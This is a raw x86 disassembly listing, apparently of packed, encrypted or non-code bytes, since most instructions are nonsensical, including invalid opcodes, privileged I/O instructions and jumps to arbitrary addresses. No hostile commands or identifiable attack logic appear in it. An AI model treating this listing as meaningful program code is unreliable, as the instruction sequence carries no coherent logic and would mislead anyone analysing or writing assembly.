  421dea:	mov    ebx,0x4e59d5c
  421def:	fmul   QWORD PTR [ebx+0x2c213942]
  421df5:	adc    eax,0xa2ecf923
  421dfa:	push   cs
  421dfb:	mov    BYTE PTR [esi-0x50],bl
  421dfe:	mov    eax,0xeeada9bb
  421e03:	push   ebp
  421e04:	daa    
  421e05:	test   eax,0xdbbef119
  421e0a:	fnstsw WORD PTR [eax+0x3d]
  421e0d:	cmp    eax,0xdc2a21df
  421e12:	fnstcw WORD PTR [edx]
  421e14:	ss push eax
  421e16:	mov    WORD PTR [eax+edi*2],?
  421e19:	inc    edx
  421e1a:	jmp    0x421e6a
  421e1c:	iret   
  421e1d:	adc    DWORD PTR [ecx+0x5666583],esp
  421e23:	inc    esi
  421e24:	inc    edi
  421e25:	iret   
  421e26:	(bad)  
  421e27:	jne    0x421e74
  421e29:	mov    dh,0x46
  421e2b:	xchg   esp,eax
  421e2c:	push   eax
  421e2d:	sub    BYTE PTR [ebp+0x48],cl
  421e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e31:	jmp    0x421dbd
  421e33:	mov    al,ds:0x1ce7e973
  421e38:	mov    bh,BYTE PTR [ecx-0x60370741]
  421e3e:	aas    
  421e3f:	ret    
  421e40:	out    0x90,al
  421e42:	sbb    eax,0xd755245a
  421e47:	xchg   esi,eax
  421e48:	or     ah,BYTE PTR [ebx]
  421e4a:	xchg   ecx,eax
  421e4b:	mov    cs,eax
  421e4d:	or     eax,0xeb6288d5
  421e52:	idiv   DWORD PTR [edx]
  421e54:	pop    esi
  421e55:	leave  
  421e56:	cli    
  421e57:	data16 js 0x421ed7
  421e5a:	adc    esp,DWORD PTR [esi]
  421e5c:	sbb    cl,cl
  421e5e:	and    dh,cl
  421e60:	jbe    0x421e31
  421e62:	mov    al,0xaa
  421e64:	mov    BYTE PTR ss:0xa9d7d7bf,ch
  421e6b:	repnz mov esp,0xffc5983
  421e71:	int    0x6d
  421e73:	mov    BYTE PTR [ecx],bh
  421e75:	or     eax,0x9b8b6ae
  421e7a:	push   0x17
  421e7c:	aad    0xd6
  421e7e:	xor    ebp,ecx
  421e80:	fcomip st,st(4)
  421e82:	adc    al,ch
  421e84:	fistp  DWORD PTR [ebx]
  421e86:	mov    eax,ds:0x5be7b1a7
  421e8b:	out    dx,eax
  421e8c:	scas   eax,DWORD PTR es:[edi]
  421e8d:	mov    cs,ebp
  421e8f:	fnstcw WORD PTR [eax-0x507fa900]
  421e95:	or     BYTE PTR ds:0xb6fef472,dh
  421e9b:	mov    dx,0xae7
  421e9f:	xor    al,0xb3
  421ea1:	push   ss
  421ea2:	stc    
  421ea3:	(bad)  
  421ea4:	jl     0x421f10
  421ea6:	inc    esi
  421ea7:	imul   edx,DWORD PTR [ebx+0x78],0x43
  421eab:	push   eax
  421eac:	sbb    dl,cl
  421eae:	rcl    bh,cl
  421eb0:	ins    BYTE PTR es:[edi],dx
  421eb1:	mov    esi,DWORD PTR [edx+ebx*4-0x62791ec2]
  421eb8:	jb     0x421e84
  421eba:	(bad)  [ebp+0x2e]
  421ebd:	shl    DWORD PTR [ecx],0xb2
  421ec0:	rcr    BYTE PTR [ecx],1
  421ec2:	lods   al,BYTE PTR ds:[esi]
  421ec3:	cli    
  421ec4:	jmp    0xf02536c3
  421ec9:	test   DWORD PTR [ebx],ebx
  421ecb:	nop
  421ecc:	cmp    BYTE PTR [ebx],ah
  421ece:	mov    edx,0x20783e56
  421ed3:	jg     0x421ee4
  421ed5:	loope  0x421eeb
  421ed7:	push   ebp
  421ed8:	xlat   BYTE PTR ds:[ebx]
  421ed9:	xchg   esi,eax
  421eda:	aad    0x79
  421edc:	bound  ecx,QWORD PTR [esi+0x538540b9]
  421ee2:	into   
  421ee3:	loop   0x421eaa
  421ee5:	jne    0x421eb5
  421ee7:	ja     0x421e8d
  421ee9:	xor    BYTE PTR [edi-0x65],0xfe
  421eed:	lock push 0x239e839a
  421ef3:	push   ss
  421ef4:	jbe    0x421ec5
  421ef6:	adc    BYTE PTR [edi],dl
  421ef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ef9:	adc    esp,edi
  421efb:	sti    
  421efc:	stos   BYTE PTR es:[edi],al
  421efd:	icebp  
  421efe:	ins    BYTE PTR es:[edi],dx
  421eff:	stos   BYTE PTR es:[edi],al
  421f00:	mov    dl,0x40
  421f02:	imul   eax,DWORD PTR [esi-0x96a2101],0x828ea029
  421f0c:	rcl    BYTE PTR [ebx+ecx*4-0x18d48831],0xcd
  421f14:	push   esi
  421f15:	call   0x2a3322ca
  421f1a:	fadd   DWORD PTR [ebx-0x13ae3196]
  421f20:	xlat   BYTE PTR ds:[ebx]
  421f21:	adc    DWORD PTR [ecx-0x45],ecx
  421f24:	es loope 0x421f71
  421f27:	paddb  mm0,QWORD PTR [ebx-0xcd98221]
  421f2e:	xchg   ebp,eax
  421f2f:	adc    ebp,ebx
  421f31:	xchg   ebx,eax
  421f32:	mov    ebp,?
  421f34:	test   DWORD PTR [edi-0x1],edi
  421f37:	out    dx,al
  421f38:	xchg   BYTE PTR [esi-0x2d],al
  421f3b:	adc    cl,BYTE PTR [edi-0x572dfd37]
  421f41:	xor    BYTE PTR [ebp+0x20],al
  421f44:	enter  0xae8a,0x52
  421f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f49:	jmp    0x323f:0x5453c168
  421f50:	jle    0x421f82
  421f52:	fs jbe 0x421f7c
  421f55:	ret    
  421f56:	call   0x9a1a35be
  421f5b:	xchg   ebx,eax
  421f5c:	jg     0x421f74
  421f5e:	add    BYTE PTR [ebx+0x5e],dh
  421f61:	nop
  421f62:	dec    DWORD PTR [edi-0x408662fd]
  421f68:	call   0xddef9106
  421f6d:	inc    esp
  421f6e:	jecxz  0x421f70
	...
  421f78:	add    BYTE PTR [eax],al
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [esp+eiz*8+0x73],bh
  421f89:	mov    ah,ah
  421f8b:	call   0x0:0x1fd0001
  421f92:	or     ebp,DWORD PTR [eax]
  421f94:	jb     0x421f35
  421f96:	pop    eax
  421f97:	inc    ebx
  421f98:	and    bl,BYTE PTR [esi+0x18]
  421f9b:	adc    dl,BYTE PTR [edx+0x28d52a17]
  421fa1:	repz push edx
  421fa3:	mov    cl,0xe8
  421fa5:	sub    al,0x94
  421fa7:	mov    esi,0xc27d81d3
  421fac:	push   cs
  421fad:	inc    edx
  421fae:	jmp    0x421f3a
  421fb0:	dec    edi
  421fb1:	sub    esp,DWORD PTR ds:0xe0cdddd6
  421fb7:	shr    BYTE PTR [ebp-0x60],0xa9
  421fbb:	or     DWORD PTR [edi-0xf81c9a6],ebx
  421fc1:	adc    bl,BYTE PTR [ecx+0x36]
  421fc4:	xor    DWORD PTR [ecx],ecx
  421fc6:	mov    bh,0xdf
  421fc8:	jbe    0x421fb6
  421fca:	jne    0x421fa1
  421fcc:	or     BYTE PTR [ebx],0x97
  421fcf:	in     al,dx
  421fd0:	pop    edi
  421fd1:	and    al,0x31
  421fd3:	gs jb  0x421fa2
  421fd6:	call   0x84d9:0x9e7dd2c2
  421fdd:	mov    esi,0x9f77a379
  421fe2:	and    BYTE PTR [edx],ah
  421fe4:	in     eax,0x63
  421fe6:	shr    edx,1
  421fe8:	or     edi,DWORD PTR [ebx+0x70]
  421feb:	int3   
  421fec:	jns    0x42200f
  421fee:	dec    eax
  421fef:	repz push ebp
  421ff1:	aaa    
  421ff2:	mov    dl,0x19
  421ff4:	jns    0x421fe0
  421ff6:	stos   BYTE PTR es:[edi],al
  421ff7:	pop    es
  421ff8:	int    0x37
  421ffa:	cmp    BYTE PTR [esi+0x66324c0d],0x14
  422001:	and    edx,DWORD PTR [edx]
  422003:	mov    ds:0xea22c0f4,al
  422008:	fndisi(8087 only) 
  42200a:	mov    fs,WORD PTR [eax+ebp*2-0x75540d50]
  422011:	pop    edx
  422012:	(bad)  
  422013:	(bad)  [ebx+0x5c0e4daf]
  422019:	inc    esp
  42201a:	lods   eax,DWORD PTR ds:[esi]
  42201b:	inc    ebx
  42201c:	out    dx,al
  42201d:	imul   esi,esi,0xffffffac
  422020:	cld    
  422021:	(bad)  
  422022:	cwde   
  422023:	push   0xdc30f496
  422028:	xchg   edi,eax
  422029:	mov    cl,BYTE PTR [eax-0x20]
  42202c:	inc    ebp
  42202d:	aaa    
  42202e:	in     al,0xc1
  422030:	xlat   BYTE PTR ds:[ebx]
  422031:	fucomi st,st(4)
  422033:	scas   al,BYTE PTR es:[edi]
  422034:	out    0xfd,eax
  422036:	mov    WORD PTR [bp+si+0x10fd],ds
  42203b:	sti    
  42203c:	dec    ebx
  42203d:	push   cs
  42203e:	jo     0x422074
  422040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422041:	cmp    al,0x50
  422043:	xchg   ebp,eax
  422044:	pop    eax
  422045:	ret    
  422046:	dec    edx
  422047:	data16 clts 
  42204a:	lahf   
  42204b:	fcmovnbe st,st(0)
  42204d:	ins    BYTE PTR es:[edi],dx
  42204e:	xchg   esi,eax
  42204f:	dec    esi
  422050:	lahf   
  422051:	sub    edi,DWORD PTR [edx-0x23]
  422054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422055:	mov    dl,0x71
  422057:	push   0x3d
  422059:	lods   eax,DWORD PTR ds:[esi]
  42205a:	cmc    
  42205b:	and    BYTE PTR [ebx+0x61],dh
  42205e:	add    eax,0x6b7c83c6
  422063:	mov    ds:0x8bc69fa3,al
  422068:	call   0x920e1e4
  42206d:	add    BYTE PTR [esi],dh
  42206f:	ins    DWORD PTR es:[edi],dx
  422070:	cs mov ch,0xd2
  422073:	sub    al,0xa4
  422075:	call   0xf16ae6ad
  42207a:	fild   QWORD PTR ds:0x511412c7
  422080:	cmp    dh,bh
  422082:	push   esp
  422083:	pop    edi
  422084:	popa   
  422085:	lods   eax,DWORD PTR ds:[esi]
  422086:	jge    0x4220b8
  422088:	icebp  
  422089:	mov    bh,0x2a
  42208b:	loop   0x42210c
  42208d:	loope  0x422090
  42208f:	sahf   
  422090:	cmc    
  422091:	jp     0x42201b
  422093:	sbb    DWORD PTR [ebx+0x28efdad6],esp
  422099:	je     0x4220f2
  42209b:	sbb    esp,eax
  42209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209e:	std    
  42209f:	retw   0xf74b
  4220a3:	scas   eax,DWORD PTR es:[edi]
  4220a4:	cld    
  4220a5:	call   0x40dd:0xef27d657
  4220ac:	jnp    0x422126
  4220ae:	adc    eax,0xeadad0eb
  4220b3:	mov    ch,0x8d
  4220b5:	out    0x11,al
  4220b7:	loopne 0x422099
  4220b9:	cs pusha 
  4220bb:	or     ecx,DWORD PTR [ebp-0x33]
  4220be:	aaa    
  4220bf:	outs   dx,BYTE PTR ds:[esi]
  4220c0:	cdq    
  4220c1:	aam    0xe1
  4220c3:	lea    edi,[edi-0x7cb9e63d]
  4220c9:	sub    DWORD PTR [esi-0x7f],ebx
  4220cc:	jnp    0x4220f1
  4220ce:	std    
  4220cf:	xchg   ebx,eax
  4220d0:	test   eax,0x4b6441eb
  4220d5:	imul   DWORD PTR [ecx]
  4220d7:	and    al,0x37
  4220d9:	test   DWORD PTR [edi],esi
  4220db:	bound  ebx,QWORD PTR [ebx]
  4220dd:	xor    eax,0xc47d3713
  4220e2:	adc    BYTE PTR [ebx+0x42],bh
  4220e5:	cmp    ebp,eax
  4220e7:	popf   
  4220e8:	(bad)  
  4220ea:	hlt    
  4220eb:	and    DWORD PTR [ebx-0x3e81e157],ebp
  4220f1:	add    DWORD PTR [edx-0x42807957],edi
  4220f7:	mov    ds:0x218ebaf9,eax
  4220fc:	sub    dl,BYTE PTR [ebp+0x49]
  4220ff:	sub    BYTE PTR ds:0x590b9920,dl
  422105:	leave  
  422106:	or     BYTE PTR [ebx+0x52],ah
  422109:	(bad)  
  42210a:	rcl    DWORD PTR [esi],cl
  42210c:	jle    0x422112
  42210e:	pop    esp
  42210f:	xchg   edx,eax
  422110:	ss xchg cl,bl
  422113:	mov    bl,0xa3
  422115:	cmc    
  422116:	dec    ebp
  422117:	fcmovbe st,st(7)
  422119:	test   eax,0x8ddd6fa7
  42211e:	retf   
  42211f:	mov    edi,DWORD PTR [edx-0x1d7afacb]
  422125:	push   ecx
  422126:	mov    bh,BYTE PTR [edi]
  422128:	push   0x43
  42212a:	sar    BYTE PTR [esi+0x1b5f7068],1
  422130:	cs adc eax,0x8d8b4f64
  422136:	adc    ecx,esi
  422138:	inc    ebx
  422139:	mov    esp,0xfd18f4d5
  42213e:	xchg   edx,eax
  42213f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422140:	fild   DWORD PTR [eax-0x57]
  422143:	ret    0x1ef
  422146:	mov    eax,ds:0x99a74bee
  42214b:	and    DWORD PTR ds:0x4d6e120a,ecx
  422151:	ret    0x6838
  422154:	cmp    DWORD PTR [ebx+0xb],esi
  422157:	loop   0x422147
  422159:	mov    cs,WORD PTR [edx-0x55adac2]
  42215f:	jl     0x42219e
  422161:	idiv   DWORD PTR [edx-0x387cb1c0]
  422167:	retf   
  422168:	push   eax
  422169:	loopne 0x422135
  42216b:	push   ecx
  42216c:	mov    cl,BYTE PTR [ebp+0x3090bae]
  422172:	and    al,ch
  422174:	ins    DWORD PTR es:[edi],dx
  422175:	push   edx
  422176:	cmp    BYTE PTR [edi],bl
  422178:	dec    edx
  422179:	sbb    edx,ebp
  42217b:	jl     0x42217f
  42217d:	cmp    eax,0x2f693062
  422182:	xor    DWORD PTR [ecx],edx
  422184:	or     DWORD PTR [ebx+0x7],edi
  422187:	xchg   esp,eax
  422188:	retf   0xbab9
  42218b:	xchg   ebx,eax
  42218c:	mov    bl,0xad
  42218e:	add    al,BYTE PTR [eax]
	...
  422198:	add    BYTE PTR [eax],al
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0x25],0xe1900d34
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	std    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [edx],dh
  4221b3:	jmp    0x90642a89
  4221b8:	adc    eax,0x773a6c9b
  4221bd:	cmp    DWORD PTR [edi-0x518073fa],ebp
  4221c3:	jnp    0x42220a
  4221c5:	data16 (bad) 
  4221c7:	mov    ah,BYTE PTR [edi+eiz*1+0x7a2dc5e3]
  4221ce:	popa   
  4221cf:	pop    ds
  4221d0:	leave  
  4221d1:	int3   
  4221d2:	in     al,0x6c
  4221d4:	lahf   
  4221d5:	fnstcw WORD PTR [edx+ebx*4]
  4221d8:	fsubr  QWORD PTR [edi]
  4221da:	xor    eax,0xe3981bb4
  4221df:	fmul   st,st(1)
  4221e1:	popa   
  4221e2:	pop    ss
  4221e3:	xlat   BYTE PTR ds:[ebx]
  4221e4:	xor    eax,0xe455cf83
  4221e9:	jns    0x4221c6
  4221eb:	adc    BYTE PTR ds:[ecx+0x3],ch
  4221ef:	imul   edx,edx,0xffffffe3
  4221f2:	shl    DWORD PTR [edx],0xc7
  4221f5:	mov    ch,0xfd
  4221f7:	jecxz  0x4221a9
  4221f9:	fisub  WORD PTR [ecx-0x51c52fc0]
  4221ff:	nop
  422200:	sbb    DWORD PTR [edi-0xa],ebx
  422203:	aam    0x92
  422205:	int3   
  422206:	jmp    0x422192
  422208:	or     al,0xf0
  42220a:	xor    al,0x2f
  42220c:	repz lock push cs
  42220f:	out    0x41,eax
  422211:	arpl   WORD PTR [eax-0x33],dx
  422214:	cmp    al,0x58
  422216:	mov    al,ds:0xf6f01d61
  42221b:	imul   BYTE PTR [edx-0x41]
  42221e:	mov    ebx,0xc89e793c
  422223:	retf   0xd4cb
  422226:	out    0x7b,eax
  422228:	hlt    
  422229:	or     DWORD PTR [edi],ebp
  42222b:	je     0x4222ab
  42222d:	jne    0x422219
  42222f:	(bad)  
  422230:	sub    bh,BYTE PTR [ebp+0x5c]
  422233:	mov    ecx,0xf9119293
  422238:	enter  0x869c,0xb5
  42223c:	sti    
  42223d:	mov    DWORD PTR [edi],esp
  42223f:	xlat   BYTE PTR ds:[ebx]
  422240:	ret    
  422241:	out    dx,al
  422242:	adc    cl,BYTE PTR [eax-0x6b0f4574]
  422248:	xor    eax,eax
  42224a:	add    BYTE PTR [edi+0x46e38556],ah
  422250:	xchg   ebp,eax
  422251:	adc    esi,esi
  422253:	daa    
  422254:	inc    esi
  422255:	iret   
  422256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422257:	fild   DWORD PTR [edx]
  422259:	jge    0x4222ad
  42225b:	pop    esp
  42225c:	push   es
  42225d:	xor    edi,DWORD PTR [eax-0x31527aa4]
  422263:	ret    0x8629
  422266:	fcomp  DWORD PTR [ecx-0x67]
  422269:	fmul   DWORD PTR [eax-0x1]
  42226c:	loopne 0x4222b6
  42226e:	sbb    eax,0x622227ef
  422273:	lds    esp,FWORD PTR [edi-0x68e9d82d]
  422279:	fsubr  QWORD PTR [edi+0x46bca200]
  42227f:	sub    al,0x1b
  422281:	xchg   ebx,eax
  422282:	sub    al,0x6f
  422284:	sbb    bl,cl
  422286:	aad    0x82
  422288:	out    0x9b,al
  42228a:	jl     0x422281
  42228c:	jp     0x42224a
  42228e:	ss jne 0x42221d
  422291:	hlt    
  422292:	push   cs
  422293:	sbb    ecx,edi
  422295:	mov    edx,0xc987db53
  42229a:	retf   
  42229b:	(bad)  
  42229c:	cs mov ebp,0x3e2d72ad
  4222a2:	mov    BYTE PTR [ebx+0x62f2b329],cl
  4222a8:	jo     0x422241
  4222aa:	cmp    DWORD PTR [eax+edx*1],eax
  4222ad:	sti    
  4222ae:	aam    0xd6
  4222b0:	dec    esp
  4222b1:	inc    esi
  4222b2:	sbb    DWORD PTR [ebx+0x744d061f],ebp
  4222b8:	fdivp  st(3),st
  4222ba:	add    cl,al
  4222bc:	inc    ecx
  4222bd:	sub    dh,BYTE PTR [esi+eiz*4]
  4222c0:	call   0xdf881788
  4222c5:	push   ds
  4222c6:	add    DWORD PTR [esi-0x5],0x7b
  4222ca:	xor    al,0x6f
  4222cc:	out    dx,al
  4222cd:	pop    eax
  4222ce:	sub    eax,0xabba7d3c
  4222d3:	(bad)  
  4222d5:	test   ch,ah
  4222d7:	push   cs
  4222d8:	adc    DWORD PTR [ecx-0x59],ecx
  4222db:	mov    ds:0x3a02b4e4,eax
  4222e0:	xor    ebx,edi
  4222e2:	inc    esi
  4222e3:	jecxz  0x422271
  4222e5:	int    0xb4
  4222e7:	ror    BYTE PTR [eax+0x3a9f037e],cl
  4222ed:	dec    ecx
  4222ee:	mov    WORD PTR [eax],es
  4222f0:	mov    dl,0xfd
  4222f2:	mov    cl,0xb5
  4222f4:	cmp    al,0x9b
  4222f6:	sbb    eax,0x96fa6080
  4222fb:	dec    esi
  4222fc:	fnstenv [ebp+0x42]
  4222ff:	sub    esp,edi
  422301:	mov    cl,0xfb
  422303:	push   ss
  422304:	and    eax,DWORD PTR [edi+0x5f8d5f2]
  42230a:	(bad)  
  42230b:	fxam   
  42230d:	popf   
  42230e:	jo     0x422305
  422310:	rcr    BYTE PTR [edx+0x26a2299a],1
  422316:	mov    ecx,0x43da8997
  42231b:	clc    
  42231c:	or     esi,DWORD PTR ds:[ebx+esi*4-0x22b1c5fe]
  422324:	mov    al,ds:0xb1918dc0
  422329:	inc    edx
  42232a:	adc    edx,DWORD PTR [ecx-0x6a6bbd0d]
  422330:	enter  0xe835,0x8
  422334:	in     eax,0x12
  422336:	cmp    al,0xdf
  422338:	ja     0x4223a6
  42233a:	lods   eax,DWORD PTR ds:[esi]
  42233b:	imul   ebp,DWORD PTR [esi-0x58],0xffffff85
  42233f:	(bad)
  422342:	fiadd  DWORD PTR [esi-0x5a]
  422345:	fbstp  TBYTE PTR [edx]
  422347:	addr16 fld st(2)
  42234a:	icebp  
  42234b:	mov    ecx,0x9f393f99
  422350:	ret    
  422351:	test   BYTE PTR ss:[ebp-0x38],ch
  422355:	or     ah,ah
  422357:	bndstx [esi],bnd2
  42235a:	push   0x2fde0050
  42235f:	pop    ds
  422360:	sbb    DWORD PTR [edx+0x2f],edx
  422363:	sub    eax,0xb7404b61
  422368:	test   al,0xab
  42236a:	(bad)  
  42236b:	dec    ebx
  42236c:	int    0x1c
  42236e:	pop    ss
  42236f:	pushf  
  422370:	repz add BYTE PTR [edx+0x4a],al
  422374:	mov    ebp,0x66c638d4
  422379:	xchg   BYTE PTR [ebp-0xf650bf],cl
  42237f:	ins    BYTE PTR es:[edi],dx
  422380:	push   eax
  422381:	iret   
  422382:	push   cs
  422383:	(bad)  
  422385:	imul   ecx,DWORD PTR [eax+edx*4+0x13],0x67
  42238a:	sar    DWORD PTR [ebx],0x6
  42238d:	addr16 sti 
  42238f:	cdq    
  422390:	pop    ebx
  422391:	pop    esp
  422392:	xor    al,dh
  422394:	aam    0xa
  422396:	out    0x70,eax
  422398:	jb     0x422334
  42239a:	adc    eax,0x7d95f83a
  42239f:	mov    dh,0xf9
  4223a1:	jp     0x42239b
  4223a3:	adc    eax,0x8fb0a71d
  4223a8:	jmp    0x11e0fc80
  4223ad:	lods   al,BYTE PTR ds:[esi]
  4223ae:	ins    BYTE PTR es:[edi],dx
	...
  4223b7:	add    BYTE PTR [eax],al
  4223b9:	add    BYTE PTR [ecx],dl
  4223bb:	push   cs
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	ret    0x5f65
  4223c9:	dec    ecx
  4223ca:	ficomp WORD PTR [esi+0x1fd0001]
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	daa    
  4223d3:	jnp    0x4223b7
  4223d5:	lahf   
  4223d6:	add    BYTE PTR [eax+0x6a],0x17
  4223da:	inc    ecx
  4223db:	push   edx
  4223dc:	out    dx,eax
  4223dd:	mov    ebx,0x7df2e507
  4223e2:	sub    DWORD PTR [edx+0x26aa8bf2],esi
  4223e8:	mov    ebx,0xb47c777e
  4223ed:	and    DWORD PTR [ebp+0x47],edx
  4223f0:	dec    esp
  4223f1:	push   0xffffff95
  4223f3:	scas   eax,DWORD PTR es:[edi]
  4223f4:	dec    esi
  4223f5:	fwait
  4223f6:	sbb    ah,bl
  4223f8:	push   es
  4223f9:	mov    al,ds:0x8b0f5c91
  4223fe:	pop    DWORD PTR [edi+0x37526b9b]
  422404:	jno    0x4223b3
  422406:	ret    0x8bc5
  422409:	lock aad 0x4a
  42240c:	sub    DWORD PTR [esi+eiz*8+0x183f16a9],0x18
  422414:	sbb    al,0x9a
  422416:	mov    cl,0xce
  422418:	out    0xd2,eax
  42241a:	stos   DWORD PTR es:[edi],eax
  42241b:	or     DWORD PTR ds:0x600826e6,esp
  422421:	mov    eax,0xa0a16fb5
  422426:	aaa    
  422427:	or     DWORD PTR ds:0x5d60b110,0x76c0b9bb
  422431:	imul   DWORD PTR [edi+0x543a1135]
  422437:	cdq    
  422438:	addr16 add eax,0xf0f8b7c7
  42243e:	dec    ebp
  42243f:	push   fs
  422441:	cwde   
  422442:	inc    edi
  422443:	daa    
  422444:	adc    cl,al
  422446:	xchg   ebx,eax
  422447:	push   0x63
  422449:	pop    edi
  42244a:	inc    ebp
  42244b:	pushf  
  42244c:	sub    ah,BYTE PTR [esi]
  42244e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42244f:	push   ebp
  422450:	sub    eax,ebx
  422452:	int    0x59
  422454:	jno    0x42242b
  422456:	(bad)  
  422457:	add    esp,eax
  422459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42245a:	adc    eax,0x79b2497f
  42245f:	paddd  mm3,QWORD PTR [ebp+0x5e]
  422463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422464:	shr    DWORD PTR [ecx],1
  422466:	jmp    0x422447
  422468:	loope  0x42246a
  42246a:	mov    eax,0x7c0180e5
  42246f:	out    dx,eax
  422470:	sbb    BYTE PTR [esi+0x7990198a],cl
  422476:	xor    DWORD PTR [esi],esp
  422478:	pop    eax
  422479:	(bad)  
  42247b:	pushf  
  42247c:	and    ecx,esi
  42247e:	jno    0x422408
  422480:	enter  0x3a19,0x2a
  422484:	std    
  422485:	and    DWORD PTR [ecx+0x25],edx
  422488:	dec    BYTE PTR [edx-0x80]
  42248b:	int3   
  42248c:	lods   al,BYTE PTR ds:[esi]
  42248d:	cdq    
  42248e:	loopne 0x4224d0
  422490:	push   ebp
  422491:	jne    0x4224a5
  422493:	or     bl,dh
  422495:	pop    ecx
  422496:	push   ds
  422497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422498:	sub    DWORD PTR [esp+ebp*1],ecx
  42249b:	inc    ecx
  42249c:	mov    es,WORD PTR [edx]
  42249e:	dec    edx
  42249f:	and    BYTE PTR [esi+0x4dea4998],bh
  4224a5:	rcr    edi,0x45
  4224a8:	pop    ebp
  4224a9:	sub    BYTE PTR [esi+0x4c],0x96
  4224ad:	stos   DWORD PTR es:[edi],eax
  4224ae:	jge    0x42245f
  4224b0:	adc    eax,DWORD PTR [esp+edi*8]
  4224b3:	gs mov ecx,0xe1406618
  4224b9:	popf   
  4224ba:	fst    st(7)
  4224bc:	add    BYTE PTR [ecx-0x65],ch
  4224bf:	cmp    BYTE PTR fs:[eax+0x28],bh
  4224c3:	or     BYTE PTR [esi],dh
  4224c5:	push   ebp
  4224c6:	mov    ds:0x4de7bd8d,al
  4224cb:	mov    ah,0x68
  4224cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224ce:	lock popf 
  4224d0:	hlt    
  4224d1:	cmp    eax,0x25f5eafb
  4224d6:	push   edi
  4224d7:	ret    
  4224d8:	ja     0x4224c2
  4224da:	sbb    dl,BYTE PTR [eax]
  4224dc:	(bad)  
  4224dd:	loopne 0x42247f
  4224df:	dec    esp
  4224e0:	pop    edx
  4224e1:	cmc    
  4224e2:	stos   DWORD PTR es:[edi],eax
  4224e3:	xor    BYTE PTR [eax-0x79],al
  4224e6:	repz push ds
  4224e8:	sub    eax,0xf86b8f05
  4224ed:	stc    
  4224ee:	cs mov bh,0xa2
  4224f1:	and    ebp,DWORD PTR [ebp+esi*4+0x898216e]
  4224f8:	retf   
  4224f9:	stos   BYTE PTR es:[edi],al
  4224fa:	stos   DWORD PTR es:[edi],eax
  4224fb:	sti    
  4224fc:	and    BYTE PTR [esi-0x32],bh
  4224ff:	sbb    cl,bl
  422501:	jne    0x422498
  422503:	xchg   edi,eax
  422504:	xchg   BYTE PTR [edi+0x61],dh
  422507:	inc    edx
  422508:	fcom   QWORD PTR ds:0x2ba06bd5
  42250e:	push   ebp
  42250f:	aam    0xe5
  422511:	mov    esp,0x1827ddbb
  422516:	in     eax,0x3e
  422518:	das    
  422519:	div    bl
  42251b:	lods   eax,DWORD PTR ds:[esi]
  42251c:	clc    
  42251d:	pop    edx
  42251e:	pop    ds
  42251f:	mov    bl,0xb4
  422521:	int    0x89
  422523:	out    dx,al
  422524:	retf   
  422525:	shl    BYTE PTR [ecx+ebx*8],1
  422528:	ror    BYTE PTR [esi-0x3b],1
  42252b:	xchg   ebx,eax
  42252c:	xor    al,0xa1
  42252e:	mov    esp,0xba4b0aa4
  422533:	mov    cl,0xcd
  422535:	adc    eax,0x2eca48f2
  42253a:	mov    bh,0x9a
  42253c:	jne    0x4224c0
  42253e:	sbb    edx,edx
  422540:	mov    ds:0x861f8712,eax
  422545:	jmp    0x42255b
  422547:	mov    ecx,0x4ed9c107
  42254c:	xchg   esi,eax
  42254d:	push   ecx
  42254e:	add    eax,DWORD PTR [esi]
  422550:	into   
  422551:	jmp    0x17fb:0x6e6617d6
  422558:	xor    DWORD PTR ds:0xfc575f9,0x57637c16
  422562:	lea    esp,[eax-0x2bbfb22e]
  422568:	jne    0x422507
  42256a:	fwait
  42256b:	mov    ds:0xe8a1abd3,eax
  422570:	fwait
  422571:	leave  
  422572:	xchg   DWORD PTR [ecx],ecx
  422574:	xor    dh,BYTE PTR [edi]
  422576:	std    
  422577:	cmp    al,0x55
  422579:	(bad)  
  42257a:	ja     0x4225ad
  42257c:	push   0xdfa1fef3
  422581:	in     al,dx
  422582:	push   ebp
  422583:	das    
  422584:	inc    esi
  422585:	loopne 0x4225a3
  422587:	js     0x422541
  422589:	mov    eax,ds:0x7f9b541
  42258e:	dec    edx
  42258f:	jns    0x4225cd
  422591:	xor    dl,BYTE PTR [ebx-0x44]
  422594:	in     eax,dx
  422595:	test   ecx,edi
  422597:	hlt    
  422598:	pop    ebx
  422599:	xchg   ebp,eax
  42259a:	sub    DWORD PTR [edx+ecx*2-0x50],ebx
  42259e:	into   
  42259f:	add    dh,al
  4225a1:	mov    ebx,0x253259fd
  4225a6:	pop    ebp
  4225a7:	mov    WORD PTR [eax+0x469da80d],es
  4225ad:	adc    al,0xe6
  4225af:	cmp    al,0xdb
  4225b1:	cmp    dl,BYTE PTR [edi]
  4225b3:	add    eax,0x9fbd4acf
  4225b8:	xor    bl,BYTE PTR [edi-0x58bb2ece]
  4225be:	mov    esp,0xaf2cf205
  4225c3:	push   edx
  4225c4:	sbb    ebx,DWORD PTR [ecx-0x12]
  4225c7:	dec    eax
  4225c8:	rol    BYTE PTR [ecx-0x3d],0x26
  4225cc:	fild   QWORD PTR [eax]
  4225ce:	xchg   edi,eax
